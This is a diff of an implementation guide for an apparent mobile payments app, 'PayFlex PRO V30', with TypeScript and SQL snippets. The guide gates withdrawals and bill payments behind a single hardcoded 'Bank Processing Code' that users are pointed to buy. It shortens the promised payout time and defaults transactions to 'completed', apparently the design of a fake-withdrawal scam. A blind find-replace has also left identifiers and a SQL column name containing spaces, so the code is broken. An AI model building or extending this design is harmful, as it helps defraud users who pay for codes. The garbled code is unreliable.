@@ -1,4 +1,4 @@
-# PayFlex PRO V30 - BPC Security Implementation Guide
+# PayFlex PRO V30 - PayFlex Code Security Implementation Guide
 
 ## Completed Updates
 
@@ -17,19 +17,19 @@
 - ✅ Icon sizes reduced (w-4 h-4 instead of w-5 h-5)
 - ✅ Grid gaps reduced (gap-1.5 instead of gap-2)
 
-### 3. BPC CODE Security Component (COMPLETE)
-- ✅ Created reusable `BPCCodeInput.tsx` component in `/components/`
-- ✅ Constant defined: `BPC2026_PRO_V30_650`
+### 3. PayFlex Code CODE Security Component (COMPLETE)
+- ✅ Created reusable `PayFlex CodeCodeInput.tsx` component in `/components/`
+- ✅ Constant defined: `PayFlex Code2026_PRO_V30_650`
 - ✅ Eye toggle for visibility
 - ✅ Real-time validation
 - ✅ Error message displays on invalid code
-- ✅ "Buy BPC" button redirects to /buy-bpc
+- ✅ "Buy PayFlex Code" button redirects to /buy-PayFlex Code
 
 ### 4. Withdraw Page (COMPLETE)
 - ✅ Nigerian banks list expanded (20 banks including OPAY, PALMPAY, MONIEPOINT, etc.)
-- ✅ BPC CODE input field with eye toggle added
-- ✅ BPC validation integrated into `validateForm()`
-- ✅ Error message: "Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction."
+- ✅ PayFlex Code CODE input field with eye toggle added
+- ✅ PayFlex Code validation integrated into `validateForm()`
+- ✅ Error message: "Wrong Bank Processing Code (PayFlex Code CODE). Kindly get the correct code to proceed with the transaction."
 - ✅ Estimated arrival changed from "24 hours" to "5 minutes - 1 hour"
 - ✅ Page size reduced (max-w-sm instead of max-w-2xl)
 - ✅ Padding reduced (py-6 instead of py-8)
@@ -39,11 +39,11 @@
 ### Pattern for All Transaction Pages
 
 Each of these pages needs the same updates:
-- Add BPC CODE validation (Copy logic from withdraw/page.tsx)
+- Add PayFlex Code CODE validation (Copy logic from withdraw/page.tsx)
 - Reduce page container size (max-w-sm)
 - Reduce padding/margins by 25%
 - Change button colors to #0000FF where appropriate
-- Add BPC CODE input field to forms
+- Add PayFlex Code CODE input field to forms
 
 **Pages to Update:**
 1. `/app/airtime/page.tsx`
@@ -51,70 +51,70 @@ Each of these pages needs the same updates:
 3. `/app/betting/page.tsx`
 4. `/app/tv-subscription/page.tsx`
 5. `/app/electricity/page.tsx`
-6. `/app/buy-bpc/page.tsx`
+6. `/app/buy-PayFlex Code/page.tsx`
 
-### Code Pattern for BPC Validation
+### Code Pattern for PayFlex Code Validation
 
 ```typescript
 // 1. Add imports
 import { Eye, EyeOff } from 'lucide-react'
 
 // 2. Add constant
-const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'
+const CORRECT_PayFlex Code_CODE = 'PayFlex Code2026_PRO_V30_650'
 
 // 3. Add state
-const [bpcCode, setBpcCode] = useState('')
-const [showBpcCode, setShowBpcCode] = useState(false)
-const [bpcError, setBpcError] = useState('')
+const [PayFlex CodeCode, setPayFlex CodeCode] = useState('')
+const [showPayFlex CodeCode, setShowPayFlex CodeCode] = useState(false)
+const [PayFlex CodeError, setPayFlex CodeError] = useState('')
 
 // 4. Add to validation
-if (!bpcCode) {
-  setBpcError('Please enter BPC CODE')
+if (!PayFlex CodeCode) {
+  setPayFlex CodeError('Please enter PayFlex Code CODE')
   return false
 }
-if (bpcCode !== CORRECT_BPC_CODE) {
-  setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
+if (PayFlex CodeCode !== CORRECT_PayFlex Code_CODE) {
+  setPayFlex CodeError('Wrong Bank Processing Code (PayFlex Code CODE). Kindly get the correct code to proceed with the transaction.')
   return false
 }
 
 // 5. Add input field in form
 <div>
   <label className="block text-sm font-semibold text-gray-900 mb-3">
-    INPUT BPC CODE
+    INPUT PayFlex Code CODE
   </label>
   <div className="relative">
     <input
-      type={showBpcCode ? 'text' : 'password'}
-      value={bpcCode}
+      type={showPayFlex CodeCode ? 'text' : 'password'}
+      value={PayFlex CodeCode}
       onChange={(e) => {
-        setBpcCode(e.target.value)
-        setBpcError('')
+        setPayFlex CodeCode(e.target.value)
+        setPayFlex CodeError('')
       }}
-      placeholder="Enter BPC Code"
+      placeholder="Enter PayFlex Code Code"
       className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
-      maxLength={CORRECT_BPC_CODE.length}
+      maxLength={CORRECT_PayFlex Code_CODE.length}
     />
     <button
       type="button"
-      onClick={() => setShowBpcCode(!showBpcCode)}
+      onClick={() => setShowPayFlex CodeCode(!showPayFlex CodeCode)}
       className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
     >
-      {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+      {showPayFlex CodeCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
     </button>
   </div>
   <button
     type="button"
-    onClick={() => router.push('/buy-bpc')}
+    onClick={() => router.push('/buy-PayFlex Code')}
     className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
   >
-    Buy BPC
+    Buy PayFlex Code
   </button>
 </div>
 
-{bpcError && (
+{PayFlex CodeError && (
   <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
     <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
-    <p className="text-sm text-red-700">{bpcError}</p>
+    <p className="text-sm text-red-700">{PayFlex CodeError}</p>
   </div>
 )}
 ```
@@ -148,9 +148,9 @@ Run these SQL commands in Supabase:
 CREATE TABLE transactions (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   user_email VARCHAR(255) NOT NULL,
-  transaction_type VARCHAR(50), -- 'airtime', 'data', 'betting', 'tv', 'electricity', 'withdraw', 'bpc'
+  transaction_type VARCHAR(50), -- 'airtime', 'data', 'betting', 'tv', 'electricity', 'withdraw', 'PayFlex Code'
   amount DECIMAL(15, 2),
-  bpc_code VARCHAR(30) DEFAULT 'BPC2026_PRO_V30_650',
+  PayFlex Code_code VARCHAR(30) DEFAULT 'PayFlex Code2026_PRO_V30_650',
   status VARCHAR(20) DEFAULT 'completed', -- 'pending', 'completed', 'failed'
   description TEXT,
   created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -194,8 +194,8 @@ useEffect(() => {
 
 ## Final Checklist
 
-- [ ] All transaction pages have BPC CODE validation
-- [ ] All forms validate BPC code before submission
+- [ ] All transaction pages have PayFlex Code CODE validation
+- [ ] All forms validate PayFlex Code code before submission
 - [ ] All success pages show "Estimated Arrival: 5 minutes - 1 hour"
 - [ ] All pages use max-w-sm for mobile optimization
 - [ ] All primary buttons are #0000FF
@@ -215,8 +215,8 @@ npm run dev
 ```
 
 ## Important Notes
-- BPC CODE is hidden by default with eye toggle
-- Same code validation on all pages: `BPC2026_PRO_V30_650`
+- PayFlex Code CODE is hidden by default with eye toggle
+- Same code validation on all pages: `PayFlex Code2026_PRO_V30_650`
 - All button sizes are reduced for mobile fintech UX
 - Container widths reduced from max-w-2xl to max-w-sm
 - All timestamp formats show "5 minutes - 1 hour" for estimated arrival
